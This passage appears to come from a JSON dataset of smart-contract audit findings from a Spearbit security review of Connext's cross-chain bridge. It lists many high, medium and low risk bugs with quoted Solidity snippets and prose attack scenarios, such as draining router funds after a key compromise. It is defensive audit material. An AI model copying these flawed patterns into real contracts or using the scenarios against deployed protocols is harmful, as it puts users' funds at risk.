implemented within the contract and its parent contracts for accepting ETH.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Cross-chain messaging via Multichain protocol will fail",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Multichain v6 is supported by Connext for cross-chain messaging. The _sendMessage function of BaseMultichain.sol relies on Multichain's anyCall for cross-chain messaging. Per the Anycall V6 documentation, a gas fee for transaction execution needs to be paid either on the source or destination chain when an anyCall is called. However, the anyCall is called without consideration of the gas fee within the connectors, and thus the anyCall will always fail. Since Multichain's hub and spoke connectors are unable to send messages, cross-chain messaging using Multichain within Connext will not work. 17 function _sendMessage(address _amb, bytes memory _data) internal { Multichain(_amb).anyCall( _amb, // Same address on every chain, using AMB as it is immutable _data, address(0), // fallback address on origin chain MIRROR_CHAIN_ID, 0 // fee paid on origin chain ); } Additionally, for the payment of the execution gas fee, a project can choose to implement either of the following methods:  Pay on the source chain by depositing the gas fee to the caller contracts.  Pay on the destination chain by depositing the gas fee to Multichain's anyCall contract at the destination chain. If Connext decides to pay the gas fee on the source chain, they would need to deposit some ETH to the connector contracts. However, it is not possible because no receive(), fallback or payable function has been implemented within the contracts and their parent contracts for accepting ETH.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: High Risk"
        ]
    },
    {
        "title": "_domainSeparatorV4() not updated after name/symbol change",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The BridgeToken allows updating the name and symbol of a token. However the _CACHED_DOMAIN_- SEPARATOR (of EIP712) isn't updated. This means that permit(), which uses _hashTypedDataV4() and _CACHED_- DOMAIN_SEPARATOR, still uses the old value. On the other hand DOMAIN_SEPARATOR() is updated. Both and especially their combination can give unexpected results. BridgeToken.sol function setDetails(string calldata _newName, string calldata _newSymbol) external override onlyOwner { // careful with naming convention change here token.name = _newName; token.symbol = _newSymbol; emit UpdateDetails(_newName, _newSymbol); } OZERC20.sol 18 function DOMAIN_SEPARATOR() external view override returns (bytes32) { // See {EIP712._buildDomainSeparator} return keccak256( abi.encode(_TYPE_HASH, keccak256(abi.encode(token.name)), _HASHED_VERSION, block.chainid, ,! address(this)) ); } function permit(...) ... { ... bytes32 _hash = _hashTypedDataV4(_structHash); ... } draft-EIP712.sol import \"./EIP712.sol\"; EIP712.sol function _hashTypedDataV4(bytes32 structHash) internal view virtual returns (bytes32) { return ECDSA.toTypedDataHash(_domainSeparatorV4(), structHash); } function _domainSeparatorV4() internal view returns (bytes32) { if (address(this) == _CACHED_THIS && block.chainid == _CACHED_CHAIN_ID) { return _CACHED_DOMAIN_SEPARATOR; } else { return _buildDomainSeparator(_TYPE_HASH, _HASHED_NAME, _HASHED_VERSION); } }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "diamondCut() allows re-execution of old updates",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Once diamondCut() is executed, ds.acceptanceTimes[keccak256(abi.encode(_diamondCut, _- init, _calldata))] is not reset to zero. This means the contract owner can rerun the old updates again without any delay by executing diamondCut() function. Assume the following: diamondCut() function is executed to update the facet selector with version_2 A bug is found in ver- sion_2 and it is rolled back Owner can still execute diamondCut() function which will again update the facet selector to version 2 since ds.acceptanceTimes[keccak256(abi.encode(_diamondCut, _init, _calldata))] is still valid",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "User may not be able to override slippage on destination",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "If BridgeFacet.execute() is executed before BridgeFacet.forceUpdateSlippage(), user won't be able to update slippage on the destination chain. In this case, the slippage specified on the source chain is used. Due to different conditions on these chains, a user may want to specify different slippage values. This can result in user loss, as a slippage higher than necessary will result the swap trade being sandwiched.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Do not rely on token balance to determine when cap is reached",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Connext Diamond defines a cap on each token. Any transfer making the total token balance more than the cap is reverted. uint256 custodied = IERC20(_local).balanceOf(address(this)) + _amount; uint256 cap = s.caps[key]; if (cap > 0 && custodied > cap) { revert RoutersFacet__addLiquidityForRouter_capReached(); } Anyone can send tokens to Connext Diamond to artificially increase the custodied amount since it depends on the token balance. This can be an expensive attack but it can become viable if price of a token (including next assets) drops.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Router recipient can be configured more than once",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The comments from the setRouterRecipient function mentioned that the router should only be able to set the recipient once. Otherwise, no problem is solved. However, based on the current implementation, it is possible for the router to set its recipient more than once. /** File: RoutersFacet.sol 394: 395: 396: 397: 398: 399: 400: 401: * @notice Sets the designated recipient for a router * @dev Router should only be able to set this once otherwise if router key compromised, * no problem is solved since attacker could just update recipient * @param router Router address to set recipient * @param recipient Recipient Address to set to router */ function setRouterRecipient(address router, address recipient) external onlyRouterOwner(router) { Let's assume that during router setup, the setupRouter function is being called and the owner is set to Alice's first EOA (0x123), and the recipient is set to Alice's second EOA (0x456). Although the comment mentioned that the setRouterRecipient should only be set once, this is not true because this function will only revert if the _- prevRecipient == recipient. As long as the new recipient is not the same as the previous recipient, the function will happily accept the new recipient. Therefore, if the router's signing key is compromised by Bob (attacker), he could call the setRouterRecipient function to change the new recipient to his personal EOA and drain the funds within the router. The setRouterRecipient function is protected by onlyRouterOwner modifier. Since Bob's has the compromised router's signing key, he will be able to pass this validation check. 21 /** File: RoutersFacet.sol 157: 158: 159: 160: 161: 162: 163: 164: 165: _; } * @notice Asserts caller is the router owner (if set) or the router itself */ modifier onlyRouterOwner(address _router) { address owner = s.routerPermissionInfo.routerOwners[_router]; if (!((owner == address(0) && msg.sender == _router) || owner == msg.sender)) revert RoutersFacet__onlyRouterOwner_notRouterOwner(); The second validation is at Line 404, which checks if the new recipient is not the same as the previous recipient. The recipient variable is set to Bob's EOA wallet, while _prevRecipient variable is set to Alice's second EOA (0x456). Therefore, the condition at Line 404 is False, and it will not revert. So Bob successfully set the recipient to his EOA at Line 407. File: RoutersFacet.sol 401: 402: 403: 404: 405: 406: 407: function setRouterRecipient(address router, address recipient) external onlyRouterOwner(router) { // Check recipient is changing address _prevRecipient = s.routerPermissionInfo.routerRecipients[router]; if (_prevRecipient == recipient) revert RoutersFacet__setRouterRecipient_notNewRecipient(); // Set new recipient s.routerPermissionInfo.routerRecipients[router] = recipient; Per the Github discussion, the motivation for such a design is the following: If a routers signing key is compromised, the attacker could drain the liquidity stored on the contract and send it to any specified address. This effectively means the key is in control of all unused liquidity on chain, which prevents router operators from adding large amounts of liquidity directly to the contract. Routers should be able to delegate the safe withdrawal address of any unused liquidity, creating a separation of concerns between router key and liquidity safety. In summary, the team is trying to create a separation of concerns between router key and liquidity safety. With the current implementation, there is no security benefit of segregating the router owner role and recipient role unless the router owner has been burned (e.g. set to address zero). Because once the router's signing key is compromised, the attacker can change the recipient anyway. The security benefits of separation of concerns will only be achieved if the recipient can truly be set only once.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "The set of tokens in an internal swap pool cannot be updated",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Once a swap is initialized by the owner or an admin (indexed by the key parameter) the _pooledTo- kens or the set of tokens used in this stable swap pool cannot be updated. Now the s.swapStorages[_key] pools are used in other facets for assets that have the hash of their canonical token id and canonical domain equal to _key, for example when we need to swap between a local and adopted asset or when a user provides liquidity or interact with other external endpoints of StableSwapFacet. If the submitted set of tokens to this pool _pooledTokens beside the local and adopted token corresponding to _key include some other bad/malicious tokens, users' funds can be at risk in the pool in question. If this happens, we need to pause the protocol, push an update, and initializeSwap again.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "An incorrect decimal supplied to initializeSwap for a token cannot be corrected",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Once a swap is initialized by the owner or an admin (indexed by the key parameter) the decimal precisions per tokens, and therefore tokenPrecisionMultipliers cannot be changed. If the supplied decimals also include a wrong value, it would cause incorrect calculation when a swap is being made and currently there is no update mechanism for tokenPrecisionMultipliers nor a mechanism for removing the swapStorages[_key].",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Presence of delegate not enforced",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "A delegate address on the destination chain can be used to fix stuck transactions by changing the slippage limits and by re-executing transactions. However, the presence of a delegate address isn't checked in _xcall(). Note: set to medium risk because tokens could get lost 23 function forceUpdateSlippage(TransferInfo calldata _params, uint256 _slippage) external ,! onlyDelegate(_params) { ... } function execute(ExecuteArgs calldata _args) external nonReentrant whenNotPaused returns (bytes32) { (bytes32 transferId, DestinationTransferStatus status) = _executeSanityChecks(_args); ... } function _executeSanityChecks(ExecuteArgs calldata _args) private view returns (bytes32, ,! DestinationTransferStatus) { // If the sender is not approved relayer, revert if (!s.approvedRelayers[msg.sender] && msg.sender != _args.params.delegate) { revert BridgeFacet__execute_unapprovedSender(); } }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Relayer could lose funds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The xReceive function on the receiver side can contain unreliable code which Relayer is unaware of. In the future, more relayers will participate in completing the transaction. Consider the following scenario: 1. Say that Relayer A executes the xReceive function on receiver side. 2. In the xReceive function, a call to withdraw function in a foreign contract is made where Relayer A is holding some balance. 3. If this foreign contract is checking tx.origin (say deposit/withdrawal were done via third party), then Relayer A's funds will be withdrawn without his permission (since tx.origin will be the Relayer).",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "TypedMemView.sameType does not use the correct right shift value to compare two bytes29s",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function sameType should shift 2 x 12 + 3 bytes to access the type flag (TTTTTTTTTT) when comparing it to 0. This is due to the fact that when using bytes29 type in bitwise operations and also comparisons to 0, a paramater of type bytes29 is zero padded from the right so that it fits into a uint256 under the hood. 0x TTTTTTTTTT AAAAAAAAAAAAAAAAAAAAAAAA LLLLLLLLLLLLLLLLLLLLLLLL 00 00 00 Currently, sameType only shifts the xored value 2 x 12 bytes so the comparison compares the type flag and the 3 leading bytes of memory address in the packing specified below: // First 5 bytes are a type flag. // - ff_ffff_fffe is reserved for unknown type. // - ff_ffff_ffff is reserved for invalid types/errors. // next 12 are memory address // next 12 are len // bottom 3 bytes are empty The function is not used in the codebase but can pose an important issue if incorporated into the project in the future. function sameType(bytes29 left, bytes29 right) internal pure returns (bool) { return (left ^ right) >> (2 * TWELVE_BYTES) == 0; }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Incorrect formula for the scaled amplification coefficient in NatSpec comments",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "In the context above, the scaled amplification coefficient a is described by the formula An(n (cid:0) 1) where A is the actual amplification coefficient in the stable swap invariant equation for n tokens. * @param a the amplification coefficient * n * (n - 1) ... The actual adjusted/scaled amplification coefficient would need to be Ann(cid:0)1 and not An(n (cid:0) 1), otherwise, most of the calculations done when swapping between 2 tokens in a pool with more than 2 tokens would be wrong. For the special case of n = 2, those values are actually equal 22(cid:0)1 = 2 = 2 (cid:1) 1. So for swaps or pools that involve only 2 tokens, the issue in the comment is not so critical. But if the number of tokens are more than 2, then we need to make sure we calculate and feed the right parameter to AppStorage.swapStorages.{initial, future}A",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "RootManager.propagate does not operate in a fail-safe manner",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "A bridge failure on one of the supported chains will cause the entire messaging network to break down. When the RootManager.propagate function is called, it will loop through the hub connector of all six chains (Ar- bitrum, Gnosis, Multichain, Optimism, Polygon, ZKSync) and attempt to send over the latest aggregated root by making a function call to the respective chain's AMB contract. There is a tight dependency between the chain's AMB and hub connector. The problem is that if one of the function calls to the chain's AMB contract reverts (e.g. one of the bridges is paused), the entire RootManager.propagate function will revert, and the messaging network will stop working until someone figure out the problem and manually removes the problematic hub connector. As Connext grows, the number of chains supported will increase, and the risk of this issue occurring will also increase.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Arborist once whitelisted cannot be removed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Arborist has the power to write over the Merkle root. In case Arborist starts misbehaving (compro- mised or security issue) then there is no way to remove this Arborist from the whitelist.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "WatcherManager is not set correctly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The setWatcherManager function missed to actually update the watcherManager, instead it is just emitting an event mentioning that Watcher Manager is updated when it is not. This could become a problem once new modules are added/revised in WatcherManager contract and Watcher- Client wants to use this upgraded WatcherManager. WatcherClient will be forced to use the outdated Watcher- Manager contract code.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Check __GAPs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "All __GAPs have the same size, while the different contracts have a different number of storage variables. If the __GAP size isn't logical it is more difficult to maintain the code. Note: set to a risk rating of medium because the probably of something going wrong with future upgrades is low to medium, and the impact of mistakes would be medium to high. LPToken.sol: uint256[49] private __GAP; // should probably be 50 OwnerPausableUpgradeable.sol: uint256[49] private __GAP; // should probably be 50 uint256[49] private __GAP; // should probably be 48 StableSwap.sol: uint256[49] private __GAP; // should probably be 48 Merkle.sol: uint256[49] private __GAP; // should probably be 47 ProposedOwnable.sol: 27",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk LPToken.sol#L16, OwnerPausableUpgradeable.sol#L16, StableSwap.sol#L39, Merkle.sol#L37,"
        ]
    },
    {
        "title": "Message can be delivered out of order",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Messages can be delivered out of order on the spoke. Anyone can call the permissionless prove- AndProcess to process the messages in any order they want. A malicious user can force the spoke to process messages in a way that is beneficial to them (e.g., front-run).",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Extra checks in _verifySender() of GnosisBase",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "According to the Gnosis bridge documentation the source chain id should also be checked using messageSourceChainId(). This is because in the future the same arbitrary message bridge contract could handle requests from different chains. If a malicious actor would be able to have access to the contract at mirrorConnector on a to-be-supported chain that is not the MIRROR_DOMAIN, they can send an arbitrary root to this mainnet/L1 hub connector which the con- nector would mark it as coming from the MIRROR_DOMAIN. So the attacker can spoof/forge function calls and asset transfers by creating a payload root and using this along with their access to mirrorConnector on chain to send a cross-chain processMessage to the Gnosis hub connector and after they can use their payload root and proofs to forge/spoof transfers on the L1 chain. Although it is unlikely that any other party could add a contract with the same address as _amb on another chain, it is safer to add additional checks. function _verifySender(address _amb, address _expected) internal view returns (bool) { require(msg.sender == _amb, \"!bridge\"); return GnosisAmb(_amb).messageSender() == _expected; } 28",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Absence of Minimum delayBlocks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Owner can accidentally set delayBlocks as 0 (or a very small delay block) which will collapse the whole fraud protection mechanism. Since there is no check for minimum delay before setting a new delay value so even a low value will be accepted by setDelayBlocks function function setDelayBlocks(uint256 _delayBlocks) public onlyOwner { require(_delayBlocks != delayBlocks, \"!delayBlocks\"); emit DelayBlocksUpdated(_delayBlocks, delayBlocks); delayBlocks = _delayBlocks; }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Add extra 0 checks in verifyAggregateRoot() and proveMessageRoot()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The functions verifyAggregateRoot() and proveMessageRoot() verify and confirm roots. A root value of 0 is a special case. If this value would be allowed, then the functions could allow invalid roots to be passed. Currently the functions verifyAggregateRoot() and proveMessageRoot() don't explicitly verify the roots are not 0. 29 function verifyAggregateRoot(bytes32 _aggregateRoot) internal { if (provenAggregateRoots[_aggregateRoot]) { return; } ... // do several verifications provenAggregateRoots[_aggregateRoot] = true; ... } function proveMessageRoot(...) ... { if (provenMessageRoots[_messageRoot]) { return; } ... // do several verifications provenMessageRoots[_messageRoot] = true; }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "_removeAssetId() should also clear custodied",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "In one of the fixes in PR 2530, _removeAssetId() doesn't clear custodied as it is assumed to be 0. function _removeAssetId(...) ... { // NOTE: custodied will always be 0 at this point } However custodied isn't always 0. Suppose cap & custodied have a value (!=0), then _setLiquidityCap() is called to set the cap to 0. The function doesn't reset the custodied value so it will stay at !=0.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Remove liquidity while paused",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function removeLiquidity() in StableSwapFacet.sol has a whenNotPaused modifier, while the comment shows Liquidity can always be removed, even when the pool is paused.. On the other hand function removeLiquidity() in StableSwap.sol doesn't have this modifier. StableSwapFacet.sol#L394-L446 // Liquidity can always be removed, even when the pool is paused. function removeLiquidity(...) external ... nonReentrant whenNotPaused ... { ... } function removeLiquidityOneToken(...) external ... nonReentrant whenNotPaused function removeLiquidityImbalance(...) external ... nonReentrant whenNotPaused ... { ... } ... { ... } StableSwap.sol#L394-L446 // Liquidity can always be removed, even when the pool is paused. function removeLiquidity(...) external ... nonReentrant ... { ... } function removeLiquidityOneToken(...) external ... nonReentrant whenNotPaused function removeLiquidityImbalance(...) external ... nonReentrant whenNotPaused ... { ... } ... { ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Relayers can frontrun each other's calls to BridgeFacet.execute",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Relayers can front run each other's calls to BridgeFacet.execute. Currently, there is no on-chain mechanism to track how many fees should be allocated to each relayer. All the transfer bump fees are funneled into one address s.relayerFeeVault.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "OptimismHubConnector.processMessageFromRoot emits MessageProcessed for already processed messages",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Calls to processMessageFromRoot with an already processed _data still emit MessageProcessed. This might cause issues for off-chain agents like relayers monitoring this event.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Add max cap for domains",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Currently there isn't any cap on the maximum amount of domains which system can support. If the size of the domains and connectors grow, at some point due to out-of-gas errors in updateHashes function, both addDomain and removeDomain could DOS.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "In certain scenarios calls to xcall... or addRouterLiquidity... can be DoSed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The owner or an admin can frontrun (or it can be by an accident) a call that:  A router has made on a canonical domain of a canonical token to supply that token as liquidity OR  A user has made to xcall... supplying a canonical token on its canonical domain. The frontrunning call would set the cap to a low number (calling updateLiquidityCap). This would cause the calls mentioned in the bullet list to fail due to the checks against IERC20(_local).balanceOf(address(this)).",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing a check against address(0) in ConnextPriceOracle's constructor",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "When ConnextPriceOracle is deployed an address _wrapped is passed to its constructor. The current codebase does not check whether the passed _wrapped can be an address(0) or not.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "_executeCalldata() can revert if insufficient gas is supplied",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function _executeCalldata() contains the statement gasleft() - 10_000. This statement can revert if the available gas is less than 10_000. Perhaps this is the expected behaviour. Note: From the Tangerine Whistle fork only a maximum 63/64 of the available gas is sent to contract being called. Therefore, 1/64th is left for the calling contract. function _executeCalldata(...) ... { ... (success, returnData) = ExcessivelySafeCall.excessivelySafeCall(_params.to, gasleft() - 10_000, ... ); ... ,! }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Be aware of precompiles",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The external calls by _executeCalldata() could call a precompile. Different chains have creative precompile implementations, so this could in theory pose problems. For example precompile 4 copies memory: what-s-the-identity-0x4-precompile Note: precompiles link to dedicated pieces of code written in Rust or Go that can be called from the EVM. Here are a few links for documentation on different chains: moonbeam precompiles, astar precompiles function _executeCalldata(...) ... { ... (success, returnData) = ExcessivelySafeCall.excessivelySafeCall( _params.to, ...); } else { returnData = IXReceiver(_params.to).xReceive(...); } ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Upgrade to solidity 0.8.17",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Solidity 0.8.17 released a bugfix where the optimizer could incorrectly remove storage writes if the code fit a certain pattern (see this security alert). This bug was introduced in 0.8.13. Since Connext is using the legacy code generation pipeline, i.e., compiling without the via-IR flag, the current code is not at risk. This is because assembly blocks dont write to storage. However, if this changes and Connext compiles through via-IR code generation, the code is more likely to be affected. One reason to use this code generation pipeline could be to enable gas optimizations not available in legacy code generation.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Add domain check in setupAssetWithDeployedRepresentation()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function setupAssetWithDeployedRepresentation() links a new _representation asset. However this should not be done on the canonical domain. So good to check this to prevent potential mistakes. function setupAssetWithDeployedRepresentation(...) ... { bytes32 key = _enrollAdoptedAndLocalAssets(_adoptedAssetId, _representation, _stableSwapPool, _canonical); ... ,! }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "If an adopted token and its canonical live on the same domain the cap for the custodied amount is applied for each of those tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "If _local is an adopted asset that lives on its canonical's original chain, then we are comparing the to-be-updated balance of this contract (custodied) with s.caps[key]. That means we are also comparing the balance of an adopted asset with the property above with the cap. For example, if A is the canonical token and B the adopted, then cap = s.caps[key] is used to cap the custodied amount in this contract for both of those tokens. So if the cap is 1000, the contract can have a balance of 1000 A and 1000 B, which is twice the amount meant to be capped. This is true basically for any approved asset with the above properties. When the owner or the admin calls setu- pAsset: // File: https://github.com/connext/nxtp/blob/32a0370edc917cc45c231565591740ff274b5c05/packages/deploym ents/contracts/contracts/core/connext/facets/TokenFacet.sol#L164-L172 ,! function setupAsset( c TokenId calldata _canonical, uint8 _canonicalDecimals, string memory _representationName, string memory _representationSymbol, address _adoptedAssetId, address _stableSwapPool, uint256 _cap ) external onlyOwnerOrAdmin returns (address _local) { such that _canonical.domain == s.domain and _adoptedAssetId != 0, then this asset has the property in ques- tion.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "There are no checks/constraints against the _representation provided to setupAssetWithDe- ployedRepresentation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "setupAssetWithDeployedRepresentation is similar to setupAsset in terms of functionality, except it does not deploy a representation token if necessary. It actually uses the _representation address given as the representation token. The _representation parameter given does not have any checks in terms of functionality compared to when setupAsset which deploys a new BridgeToken instance: // File: packages\\deployments\\contracts\\contracts\\core\\connext\\facets\\TokenFacet.sol#L399 _token = address(new BridgeToken(_decimals, _name, _symbol)); Basically, representation needs to implement IBridgeToken (mint, burn, setDetails, ... ) and some sort of IERC20. Otherwise, if a function from IBridgeToken is not implemented or if it does not have IERC20 functionality, it can cause failure/reverts in some functions in this codebase. Another thing that is important is that the decimals for _representation should be equal to the decimals precision of the canonical token. And that _representation should not be able to update/change its decimals. Also, this opens an opportunity for a bad owner or admin to provide a malicious _representation to this function. This does not have to be a malicious act, it can also happen by mistake from for example an admin. Additionally the Connext Diamond must have the \"right\" to mint() and burn() the tokens.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "In dequeueVerified when no verified items are found in the queue last == first - 1",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The comment in dequeueVerified mentions that when no verified items are found in the queue, then last == first. But this is not true since the loop condition is last >= first and the loop only terminates (not considering the break) when last == first - 1. It is important to correct this incorrect statement in the comment, since a dev/user can by mistake take this state- ment as true and modify/use the code with this incorrect assumption in mind.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Dirty bytes in _loc and _len can override other values when packing a typed memory view in unsafeBuildUnchecked",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "For a TypeedMemView, the location and the length are supposed to occupy 12 bytes (uint96), but the type used for these values for the input parameters for unsafeBuildUnchecked is uint256. This would allow those values to carry dirty bytes and when the following calculations are performed: newView := shl(96, or(newView, _type)) // insert type newView := shl(96, or(newView, _loc)) // insert loc newView := shl(24, or(newView, _len)) // empty bottom 3 bytes _loc can potentially manipulate the type section of the view and _len can potentially manipulate both the _loc and the _type section.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "To use sha2, hash160 and hash256 of TypedMemView the hard-coded precompile addresses would need to be checked to make sure they return the corresponding hash values.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "sha2, hash160 and hash256 assume that the precompile contracts at address(2) and address(3) calculate and return the sha256 and ripemd160 hashes of the provided memory chunks. These assumptions depend on the chain that the project is going to be deployed on.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "sha2, hash160 and hash256 of TypedMemView.sha2 do not clear the memory after calculating the hash",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "When a call to the precompile contract at address(2) (or at address(3)) is made, the returned value is placed at the slot pointed by the free memory pointer and then placed on the stack. The free memory pointer is not incremented to account for this used memory position nor the code tries to clean this memory slot of 32 bytes. Therefore after a call to sha2, hash160 or hash256, we would end up with dirty bytes.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Fee on transfer token support",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
